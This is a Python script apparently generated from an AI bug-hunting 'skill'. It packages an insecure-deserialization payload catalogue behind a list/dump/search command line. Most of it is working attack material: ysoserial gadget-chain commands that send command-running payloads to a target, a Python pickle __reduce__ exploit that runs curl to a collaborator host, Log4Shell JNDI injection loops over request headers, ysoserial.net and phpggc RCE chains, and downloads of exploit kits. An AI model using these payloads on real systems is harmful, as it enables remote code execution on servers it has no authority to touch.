#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-deserialization

Skill: HUNT-DESERIALIZATION — Insecure Deserialization
Desc : Hunt Insecure Deserialization — Java gadget chains (ysoserial), PHP object injection (phpggc), Python pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell. RCE via deserialization is almost always Critical. Use when target runs Java, PHP serialization, Python pickle, .NET, or Ruby on Rails.

Run:  python claude-bughunter-hunt-deserialization.py --help
      python claude-bughunter-hunt-deserialization.py --list
      python claude-bughunter-hunt-deserialization.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-deserialization'
TITLE = 'HUNT-DESERIALIZATION — Insecure Deserialization'
DESCRIPTION = 'Hunt Insecure Deserialization — Java gadget chains (ysoserial), PHP object injection (phpggc), Python pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell. RCE via deserialization is almost always Critical. Use when target runs Java, PHP serialization, Python pickle, .NET, or Ruby on Rails.'

PAYLOADS = {
    'main': ["name: hunt-deserialization", "description: Hunt Insecure Deserialization \u2014 Java gadget chains (ysoserial), PHP object injection (phpggc), Python pickle RCE, .NET BinaryFormatter, Ruby Marshal.load, JNDI/Log4Shell. RCE via deserialization is almost always Critical. Use when target runs Java, PHP serialization, Python pickle, .NET, or Ruby on Rails.", "sources: hackerone_public", "report_count: 22"],
    'hunt-deserialization-insecure-deserialization': [],
    'crown-jewel-targets': ["Deserialization bugs are almost always Critical \u2014 they lead directly to RCE without prerequisite conditions.", "**Highest-value chains:**", "- **Java ysoserial gadget chains** \u2014 CommonsCollections, Spring, JNDI, Groovy gadgets \u2192 full OS command execution", "- **PHP Object Injection** \u2014 `__wakeup` / `__destruct` magic methods \u2192 file write / RCE", "- **Python pickle** \u2014 `pickle.loads(attacker_data)` \u2192 `__reduce__` \u2192 `os.system('id')`", "- **.NET BinaryFormatter** \u2014 TypeConfuseDelegate gadget chain \u2192 RCE", "- **Ruby Marshal.load** \u2014 Gem::Requirement, Gem::Installer gadgets \u2192 RCE", "- **JNDI injection** \u2014 Log4Shell pattern: `${jndi:ldap://attacker/a}` \u2192 class load \u2192 RCE"],
    'attack-surface-signals': [],
    'detection-patterns': ["```bash"],
    'java-serialized-objects-start-with-ac-ed-00-05-hex-or-ro0a-base64': ["echo \"rO0ABXQ=\" | base64 -d | xxd | head -1  # shows: ac ed 00 05"],
    'php-serialization-o-8-stdclass-0': [],
    'python-pickle-starts-with-x80-x04-protocol-4-or-x80-x02': [],
    'apache-shiro-rememberme-cookie-present': ["curl -sI https://$TARGET/ | grep -i \"Set-Cookie.*rememberMe\""],
    'log4j-test-user-controlled-fields-for-jndi-interpolation': ["curl -H 'User-Agent: ${jndi:dns://COLLAB_HOST/a}' https://$TARGET/"],
    'header-cookie-signals': ["Content-Type: application/x-java-serialized-object", "Cookie containing rO0= prefix (Java base64 serialized)", "Cookie: rememberMe= (Apache Shiro)", "Cookie: _VIEWSTATE (ASP.NET ViewState without encryption)", "Endpoints: /remoting/, /invoker/, /jmx-console/, /wls-wsat/"],
    'step-by-step-hunting-methodology': [],
    'phase-1-java-deserialization-ysoserial': ["```bash"],
    'install-ysoserial': ["wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar"],
    'generate-oob-detection-payload': ["java -jar ysoserial-all.jar CommonsCollections6 \\", "'curl http://COLLAB_HOST/ysoserial' | base64 -w0"],
    'send-as-body-or-cookie': ["java -jar ysoserial-all.jar CommonsCollections6 'id > /tmp/pwned' | base64 | \\", "curl -s https://$TARGET/wls-wsat/CoordinatorPortType \\", "-H \"Content-Type: application/x-java-serialized-object\" \\", "--data-binary @-"],
    'apache-shiro-exploit-default-aes-key': ["python3 shiro_exploit.py -u https://$TARGET/ -c \"id\""],
    'phase-2-php-object-injection': ["```bash"],
    'find-unserialize-calls-in-source': ["grep -r \"unserialize(\" --include=\"*.php\" ."],
    'inject-test-o-8-stdclass-1-s-4-test-s-5-value': [],
    'send-in-cookie-post-param-or-hidden-form-field': [],
    'if-error-changes-deserialization-confirmed': [],
    'craft-gadget-chain-using-phpggc': ["git clone https://github.com/ambionics/phpggc", "php phpggc -l  # list chains", "php phpggc Laravel/RCE5 system id | base64"],
    'phase-3-python-pickle': ["```bash"],
    'generate-oob-payload': ["python3 -c \"", "import pickle, os, base64", "class Exploit(object):", "def __reduce__(self):", "return (os.system, ('curl http://COLLAB_HOST/pickle-rce',))", "print(base64.b64encode(pickle.dumps(Exploit())).decode())"],
    'send-as-cookie-or-post-body': ["curl -s https://$TARGET/api/load-model \\", "-H \"Content-Type: application/octet-stream\" \\", "--data-binary @payload.pkl"],
    'phase-4-net-viewstate': ["```bash"],
    'check-if-viewstate-is-unsigned-mac-disabled': [],
    'look-for-viewstate-in-html-source-without-viewstatemac': [],
    'ysoserial-net': ["dotnet YSoSerial.exe -f BinaryFormatter -g TypeConfuseDelegate \\", "-c \"cmd /c curl http://COLLAB_HOST/viewstate-rce\" -o base64"],
    'phase-5-log4shell-jndi': ["```bash"],
    'test-all-user-controlled-inputs': ["COLLAB=\"COLLAB_HOST\"", "for HEADER in \"User-Agent\" \"X-Forwarded-For\" \"Referer\" \"X-Api-Version\" \"Accept-Language\"; do", "curl -s https://$TARGET/ -H \"$HEADER: \\${jndi:dns://$COLLAB/$HEADER}\" &"],
    'test-post-body-fields': ["curl -s -X POST https://$TARGET/api/login \\", "-H \"Content-Type: application/json\" \\", "-d \"{\\\"username\\\": \\\"\\${jndi:ldap://$COLLAB/a}\\\"}\""],
    'phase-6-ruby-marshal': ["```bash"],
    'look-for-marshal-load-in-source': ["grep -r \"Marshal.load\\|Marshal.restore\" --include=\"*.rb\" ."],
    'gem-requirement-gadget-chain-via-marshalable-objects': [],
    'use-ruby-advisory-db-gadgets': [],
    'chain-table': [],
    'automation': ["```bash"],
    'oob-listener': ["interactsh-client -v -n 5"],
    'jndi-exploit-kit': ["git clone https://github.com/pimps/JNDI-Exploit-Kit"],
    'validation': ["\u2705 DNS/HTTP callback from COLLAB host: blind deserialization confirmed", "\u2705 Command output in response: full RCE confirmed", "**Severity:** Almost always **Critical** \u2014 RCE with server process privileges."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()